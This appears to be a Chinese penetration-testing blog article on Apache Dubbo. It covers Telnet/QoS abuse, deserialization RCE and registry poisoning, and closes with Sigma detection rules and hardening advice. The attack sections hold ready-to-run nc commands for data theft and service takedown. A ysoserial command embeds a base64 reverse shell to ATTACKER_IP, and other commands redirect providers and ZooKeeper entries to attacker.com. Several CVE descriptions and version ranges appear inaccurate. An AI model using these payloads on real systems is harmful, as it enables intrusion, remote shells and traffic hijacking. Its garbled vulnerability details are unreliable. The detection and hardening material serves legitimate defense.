---
title: "Apache Dubbo Telnet / QoS / 反序列化 RCE 利用技术"
date: 2026-06-21T18:00:00+08:00
draft: false
weight: 100
description: "Apache Dubbo RPC 框架渗透测试：Telnet 未授权访问、QoS 服务攻击、Hessian2 反序列化 RCE、CVE-2019-17564 / CVE-2023-23638 漏洞利用链路与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Apache Dubbo", "Telnet", "QoS", "反序列化", "RCE", "CVE-2019-17564", "CVE-2023-23638", "RPC安全", "渗透测试"]
---

## 0x00 攻击面总览

Apache Dubbo 是高性能 RPC 框架，暴露多个高危攻击面：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| Dubbo Protocol | 20880 | TCP | RPC 调用、Hessian2 反序列化 |
| Telnet (QoS) | 22222 | TCP | 未授权命令执行、服务管理 |
| QoS HTTP | 22223 | HTTP | 健康检查、服务状态 |
| Triple Protocol | 50051 | HTTP/2 | gRPC 兼容协议 |
| REST Protocol | 8080 | HTTP | RESTful 接口 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Apache Dubbo 攻击面                          │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ Dubbo Proto  │    │ Telnet/QoS   │    │ Triple       │    │
│  │ :20880       │    │ :22222       │    │ :50051       │    │
│  │ 反序列化/RCE │    │ 命令执行     │    │ 认证绕过     │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              内网 / 微服务网络                             │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① Telnet :22222 → 未授权访问 → ls/invoke → 信息泄露     │ │
│  │  ② Telnet :22222 → invoke → 反序列化 → RCE               │ │
│  │  ③ QoS → 服务上下线 → 拒绝服务                           │ │
│  │  ④ Dubbo :20880 → Hessian2 反序列化 → RCE                │ │
│  │  ⑤ CVE-2023-23638 → Triple 认证绕过 → RCE                │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • Telnet 默认无认证                                           │
│  • QoS 默认绑定 0.0.0.0                                       │
│  • Hessian2 反序列化无白名单                                   │
│  • Dubbo 协议默认无认证                                        │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 20880,22222,22223,50051,8080 \
  -oN dubbo_scan.txt <target>
```

**典型扫描结果**：

```
PORT      STATE SERVICE     VERSION
20880/tcp open  dubbo       Apache Dubbo RPC
22222/tcp open  telnet      Dubbo QoS Telnet
22223/tcp open  http        Dubbo QoS HTTP
```

### 1.2 版本指纹

```bash
# Telnet 连接测试
echo "ls" | nc target 22222

# 响应示例
As Provider side:
+----------------------------------+-------------------+
|       Provider Service Name      |      Invoked      |
+----------------------------------+-------------------+
|  com.example.UserService:1.0.0   |       true        |
+----------------------------------+-------------------+

# QoS HTTP 健康检查
curl -s "http://target:22223/health"
# 返回：OK 或 READY

# Dubbo 协议探测
echo -ne "\xda\xbb\xc2\x00\x00\x00\x00\x00" | nc -w3 target 20880 | xxd
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
port:20880 dubbo
port:22222 telnet

# FOFA
port="20880" && protocol="dubbo"
port="22222"
```

---

## 0x02 Telnet 未授权访问 — 命令执行

### 2.1 Telnet 命令枚举

```bash
# 连接 Telnet
nc target 22222

# 可用命令
# ls     - 列出服务
# ps     - 列出进程
# invoke - 调用服务方法
# online - 上线服务
# offline - 下线服务
# log    - 查看日志
# help   - 帮助
```

### 2.2 服务枚举

```bash
# 列出所有 Provider 服务
echo "ls" | nc target 22222

# 列出所有 Consumer 服务
echo "ls consumer" | nc target 22222

# 查看服务详情
echo "ls com.example.UserService" | nc target 22222
```

### 2.3 服务调用 — 数据窃取

```bash
# 调用服务方法
echo 'invoke com.example.UserService.getUserById(1)' | nc target 22222

# 调用返回敏感数据的方法
echo 'invoke com.example.UserService.getAllUsers()' | nc target 22222

# 调用管理方法
echo 'invoke com.example.AdminService.executeCommand("id")' | nc target 22222
```

### 2.4 服务上下线 — DoS

```bash
# 下线服务
echo "offline com.example.UserService" | nc target 22222

# 上线服务
echo "online com.example.UserService" | nc target 22222
```

---

## 0x03 QoS 服务攻击

### 3.1 QoS HTTP 接口

```bash
# 健康检查
curl -s "http://target:22223/health"

# 就绪检查
curl -s "http://target:22223/ready"

# 存活检查
curl -s "http://target:22223/live"

# 服务状态
curl -s "http://target:22223/services" | python3 -m json.tool
```

### 3.2 Kubernetes 健康探测滥用

```bash
# 在 K8s 环境中，QoS 端口可能被用于健康探测
# 攻击者可以通过 QoS 接口获取服务拓扑信息
curl -s "http://target:22223/services" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for svc in data:
    print(f\"{svc['serviceName']} | {svc['status']} | {svc.get('address', 'N/A')}\")
"
```

---

## 0x04 反序列化 RCE

### 4.1 CVE-2019-17564 — Hessian2 反序列化

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache Dubbo 2.6.0 - 2.6.11, 2.7.0 - 2.7.8 |
| CVSS | 9.8（Critical） |
| 类型 | Hessian2 反序列化 |
| 攻击向量 | Dubbo Protocol (20880) / Telnet (22222) |
| 根因 | Hessian2 反序列化无白名单限制 |

### 4.2 通过 Telnet invoke 触发反序列化

```bash
# 通过 invoke 命令触发反序列化
echo 'invoke com.example.Service.method({"@type":"java.lang.Runtime","cmd":"id"})' | nc target 22222
```

### 4.3 通过 Dubbo 协议触发反序列化

```bash
# 使用 ysoserial 生成 Hessian2 payload
java -jar ysoserial-modified.jar Hessian2 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > payload.bin

# 通过 Dubbo 协议发送 payload
cat payload.bin | nc target 20880
```

### 4.4 CVE-2023-23638 — Triple 协议认证绕过

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache Dubbo 3.1.0 - 3.1.10 |
| CVSS | 9.8（Critical） |
| 类型 | 认证绕过 |
| 攻击向量 | Triple Protocol (50051) |
| 根因 | Triple 协议认证检查逻辑缺陷 |

---

## 0x05 高级利用技术

### 5.1 Dubbo Filter 内存马

```bash
# 通过反序列化注入 Dubbo Filter 类型内存马
# 内存马拦截所有 RPC 调用，实现持久化控制

# 注入后，所有 RPC 调用都会经过恶意 Filter
# 可以通过特定的方法参数触发命令执行
```

### 5.2 动态 Provider 注册后门

```bash
# 注册恶意 Provider 到注册中心
# 当 Consumer 调用服务时，流量被导向攻击者控制的 Provider

# 通过 Telnet 或管理 API 注册
echo 'register com.example.BackdoorService@attacker.com:20880' | nc target 22222
```

### 5.3 注册中心投毒

```bash
# 攻击 ZooKeeper/Nacos 注册中心
# 替换合法 Provider 地址为攻击者地址

# ZooKeeper
zkCli.sh -server target:2181
[zk: target:2181(CONNECTED)] set /dubbo/com.example.UserService/providers "dubbo://attacker.com:20880"
```

---

## 0x06 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2019-17564 | 反序列化 RCE | 9.8 | Hessian2 反序列化 RCE |
| CVE-2021-25640 | 反序列化 RCE | 8.0 | Hessian 反序列化 RCE |
| CVE-2023-23638 | 认证绕过 | 9.8 | Triple 协议认证绕过 |
| CVE-2020-1948 | 反序列化 | 9.8 | Hessian 反序列化 |

**CVE-2019-17564 影响范围**：

Apache Dubbo 2.6.0 - 2.6.11, 2.7.0 - 2.7.8。攻击者通过 Hessian2 反序列化实现 RCE，CVSS 9.8。

---

## 0x07 蓝队检测方案

### 7.1 网络层检测

```yaml
title: Dubbo Telnet/QoS 外部访问检测
id: dubbo-telnet-external-access
status: experimental
description: 检测来自非内网段的 Dubbo Telnet/QoS 端口访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 22222
      - 22223
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 7.2 反序列化检测

```yaml
title: Dubbo Hessian2 反序列化攻击检测
id: dubbo-hessian2-deserialization
status: experimental
description: 检测 Dubbo 协议中的 Hessian2 反序列化攻击
logsource:
  category: network
  service: dubbo
detection:
  selection_magic:
    payload|starts_with: "|da|bb|c2"
  selection_suspicious:
    payload|contains:
      - "Runtime"
      - "ProcessBuilder"
      - "CommonsCollections"
      - "TemplatesImpl"
  condition: selection_magic and selection_suspicious
level: critical
```

### 7.3 审计日志分析

```bash
# 监控 Telnet 连接
grep "telnet" /opt/dubbo/logs/dubbo.log

# 检测 invoke 命令
grep "invoke" /opt/dubbo/logs/dubbo.log

# 检测 offline/online 操作
grep -E "(offline|online)" /opt/dubbo/logs/dubbo.log

# 监控反序列化异常
grep -i "deserializ\|hessian" /opt/dubbo/logs/dubbo.log

# 监控注册中心异常
grep "registry" /opt/dubbo/logs/dubbo.log
```

### 7.4 加固清单

```
[ ] 升级至 Apache Dubbo >= 2.7.21 / 3.1.11 / 3.2.0（修复已知 CVE）
[ ] 禁用 Telnet 或限制仅内网访问：
    dubbo.application.qos-enable=false
[ ] QoS 绑定到 localhost：
    dubbo.application.qos-bind=127.0.0.1
[ ] 启用 Dubbo 协议认证
[ ] 配置 Hessian2 反序列化白名单
[ ] Dubbo Protocol (20880) 仅允许内网访问
[ ] 配置防火墙规则限制 20880/22222/22223 端口访问源
[ ] 启用 mTLS 加密通信
[ ] 部署 RASP 检测反序列化攻击
[ ] 启用审计日志并接入 SIEM
[ ] 监控 Telnet invoke/offline/online 命令
[ ] 监控注册中心异常变更
[ ] 定期审查 Provider/Consumer 注册列表
[ ] 使用 Dubbo Filter 实现请求审计
```

---

## 0x08 渗透测试检查清单

```
[ ] 端口扫描：20880, 22222, 22223, 50051, 8080
[ ] Telnet (22222) 未授权访问测试
[ ] Telnet 命令枚举（ls, ps, invoke）
[ ] 服务调用测试（invoke 方法调用）
[ ] 服务上下线测试（offline/online）
[ ] QoS HTTP (22223) 信息泄露测试
[ ] CVE-2019-17564 Hessian2 反序列化 RCE 测试
[ ] CVE-2023-23638 Triple 认证绕过测试
[ ] 注册中心投毒测试
[ ] 动态 Provider 注册测试
[ ] 内存马注入测试
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
[ ] 反序列化白名单配置检查
```

---

## 0x09 小结

Apache Dubbo 的攻击面以 **Telnet QoS（端口 22222）** 和 **Dubbo Protocol（端口 20880）** 为核心。Telnet 默认无认证，攻击者可以直接执行 `ls`、`invoke` 命令枚举服务并调用方法，甚至触发反序列化实现 RCE。**CVE-2019-17564**（CVSS 9.8）通过 Hessian2 反序列化实现 RCE，**CVE-2023-23638**（CVSS 9.8）通过 Triple 协议认证绕过实现 RCE。注册中心投毒可导致整个微服务集群流量被劫持。蓝队应重点关注：升级至修复版本、禁用 Telnet 或限制网络访问、QoS 绑定到 localhost、配置反序列化白名单、启用认证和 mTLS、将审计日志接入 SIEM。
